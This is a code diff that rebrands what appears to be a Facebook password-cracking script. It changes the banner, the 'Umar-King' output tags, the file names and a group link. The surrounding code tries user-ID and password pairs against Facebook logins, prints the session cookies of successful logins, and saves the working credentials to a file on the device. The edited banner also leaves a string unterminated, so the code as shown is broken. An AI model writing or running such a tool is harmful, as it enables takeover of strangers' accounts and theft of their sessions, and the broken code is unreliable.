@@ -76,11 +76,15 @@ for xd in range(10000):
 	ugen.append(uakua)
 
 logo = ("""  
- \033[1;32m╔══════════════════════════════════════════════════════════╗\033[1;93m
-\033[1;32m║	         \033[1;93m ─━<🌺Assalamu Alaikum🌺>━─\033[1;32m	           ║
-\033[1;32m╔══════════════════════════════════════════════════════════╗
-
-\033[1;32m╚═════════════════════════════════════════════════════════════════╝""")
+                              
+   (            )             
+   )\  (     ( /(    (   (    
+ (((_) )\ )  )\())  ))\  )(   
+ )\___(()/( ((_)\  /((_)(()\  
+((/ __|)(_))| |(_)(_))   ((_) 
+ | (__| || || '_ \/ -_) | '_| 
+  \___|\_, ||_.__/\___| |_|   
+       |__/                   
 class Main:
     def __init__(self):
         self.id = []
@@ -144,7 +148,7 @@ def gml():
     print(logo)
     kode = input(' [+] \033[38;5;46mFAST NAME : ')
     os.system('clear')
-    os.system('xdg-https://facebook.com/groups/1035734253633702/')
+    os.system('xdg-https://www.facebook.com/groups/1020338239226719/')
     print(logo)
     kodex = input(' [+] \033[38;5;46mLAST NAME :  ')
     os.system('clear')
@@ -221,22 +225,22 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[ARAFAT-OK🐼] {uid} | {ps}")
+                print(f"\033[38;5;46m⫷ 𝐔𝐦𝐚𝐫-𝐊𝐢𝐧𝐠-OK ⫸🐼 {uid} | {ps}")
                 print(f" Cookie : {coki}")
-                open('/sdcard/ARAFAT-ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/UMAR-ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                #print(f"\x1b[38;5;196m[ARAFAT-CP🍾] {uid}|{ps}")
-                #open('/sdcard/ARAFAT-cp.txt', 'a').write( uid+' | '+ps+' \n')
+                #print(f"\x1b[38;5;196m⫷ 𝐔𝐦𝐚𝐫-𝐊𝐢𝐧𝐠 ⫸ {uid}|{ps}")
+                #open('/sdcard/UMAR-cp.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[38;5;46m[𝘽𝙊𝙎𝙎____ARAFAT] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[38;5;46m⫷ 𝐔𝐦𝐚𝐫-𝐊𝐢𝐧𝐠 ⫸ \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
